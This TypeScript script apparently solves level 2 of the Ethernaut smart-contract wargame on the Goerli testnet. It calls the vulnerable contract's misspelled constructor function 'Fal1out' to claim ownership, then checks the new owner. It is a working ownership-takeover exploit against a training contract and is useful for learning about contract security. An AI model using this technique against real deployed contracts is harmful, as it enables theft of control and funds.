import FalloutJSON from "../../../artifacts/contracts/level2/Fallout.sol/Fallout.json"

const ethers = require('ethers');
require ('dotenv').config ()

const provider = new ethers.providers.AlchemyProvider('goerli', process.env.ALCHEMY_API_KEY);
const privateKey: string = process.env.ACTOR_PRIVATE_KEY as string;
const falloutContractAddress: string = '0xc8340Dc2b1a7044377aC9c867099e364D5B6695c';



// Define all function calls used
async function main(){
  console.log(`Ethernaut level 2 - script made by JoVi.\n ------ \n`);
  const wallet = await new ethers.Wallet( privateKey, provider);
  const signer = wallet.connect(provider);
  const falloutContract = new ethers.Contract(falloutContractAddress, FalloutJSON.abi, signer);


  const msgValue = '10000000000000000'
  
  
  console.log(`Attempting to claim ${falloutContract.address} contract's ownership. \n ------ \n`);

  const falloutContractTx = await falloutContract.Fal1out({value: msgValue, gasLimit: 500000});
  const falloutContractTxReceipt = await falloutContractTx.wait();
  console.log(`Transaction succesfully pushed to the chain.\n ------ \n`);

  console.log(`Checking target contract's owner.\n ------ \n`);
  const falloutContractOwner = await falloutContract.owner();
  
  console.log(`Contract's owner is: ${falloutContractOwner}.\n ------ \n`);

  if (falloutContractOwner == '0x67A27C624ac5c0F753259e9dA4cd007E4E7b3eA7'){
    console.log(`Ownership claim succesfull.`);
  } else {
    console.log(`Ownership claim failed. Please review your code and try again.`);
  }

  process.exit();
  
}


// Execute
main();